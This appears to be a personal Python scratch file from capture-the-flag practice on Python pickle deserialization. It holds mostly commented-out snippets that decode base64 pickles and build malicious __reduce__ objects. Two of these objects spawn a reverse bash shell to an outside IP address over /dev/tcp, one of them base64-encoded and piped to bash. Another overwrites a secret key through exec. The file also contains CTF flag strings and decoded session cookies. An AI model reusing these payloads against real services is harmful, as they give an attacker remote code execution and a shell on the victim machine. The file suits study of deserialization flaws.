# import pickle
# import base64
# a="gASVWQAAAAAAAAB9lCiMBW1vbmV5lEsBjAdoaXN0b3J5lF2UjBBhbnRpX3RhbXBlcl9obWFjlIwoZDNkNmE5YzhhYTRhYWYwN2Y3MGVlZjBkM2QyYWQwZTRjMDYyOTQ1ZpR1Lg=="
# print(pickle.loads(base64.b64decode(a)))
# import pickle
# class A():
#     def __reduce__(self):
#         return(exec,("global key;key=b'11111111111111111111111111111111'",)) 
# a=A()
# print(pickle.dumps(a))
# import base64
# import pickle


# class shell(object):
#     def __reduce__(self):
#     # bash -i >& /dev/tcp/你的ip/9999 0>&1的base64
#     #不能直接bash -i 0>&1那种写法，因为像是&这些符号 都是linux的shell关键字 会影响他的语法
#         return (eval, ("__import__('os').system('echo YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzMC43OC44OS84MDA1IDA+JjE= | base64 -d | bash ')",))


# k = shell()
# print(base64.b64encode(pickle.dumps(k)))
# import base64
# import pickle
# a='''BAh7B0kiD3Nlc3Npb25faWQGOgZFVEkiRTE4MDMzNmZjMGM5YWJhNzlhZjMz
# ZWQzN2IxMzJlNjAwMjdkM2M2NzA2NjgwMTkwN2ExNDM0Mzg5NjZlYjliZGYG
# OwBGSSIKYm9hcmQGOwBGbzoKQm9hcmQGOgtAYm9hcmRbDkkiBiAGOwBUQAtA
# C0ALQAtAC0ALQAtACw=='''
# print(pickle.loads(base64.b64decode(a)))
import pickle
import base64
#a=b'\x80\x04\x95\x7f\x00\x00\x00\x00\x00\x00\x00]\x94(\x8c\x01f\x94\x8c\x01l\x94\x8c\x01a\x94\x8c\x01g\x94\x8c\x01_\x94\x8c\x01i\x94\x8c\x01s\x94\x8c\x01:\x94\x8c\x010\x94\x8c\x015\x94h\x03\x8c\x016\x94\x8c\x017\x94\x8c\x011\x94\x8c\x01c\x94h\x0bh\x0bh\x03\x8c\x01e\x94h\x01h\x0fh\x03h\r\x8c\x012\x94\x8c\x014\x94h\x0eh\x0eh\t\x8c\x018\x94\x8c\x01b\x94h\x0ch\x0bh\x0fh\x03h\x0b\x8c\x01d\x94\x8c\x013\x94h\th\x13h\x13e.'
# a='MTY4NTM1NDQ1OXxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV2QxWlhOMHx2T2-HjLKJxaQawiIa-I4e_0d3oPGVy8lb7id8-_PSSQ='
# print(pickle.loads(base64.b64decode(a)))
# print(pickle.loads(a))
# import pickle
# class A(object):
#     def __reduce__(self):
#         return (exec,('os.system("bash -c \'bash -i >& /dev/tcp/8.130.78.89/8009 0>&1\'")',))
# a=A()
# pickle1=pickle.dumps(a)
# print(pickle1)
# a="ZSCTF{bc4b90cf-258f-40c4-ec43-08b16766d9e5}"
# print(base64.b64encode(pickle.dumps(a)))
a='gASVLwAAAAAAAACMK1pTQ1RGe2JjNGI5MGNmLTI1OGYtNDBjNC1lYzQzLTA4YjE2NzY2ZDllNX2ULg=='
print(base64.b64decode(a))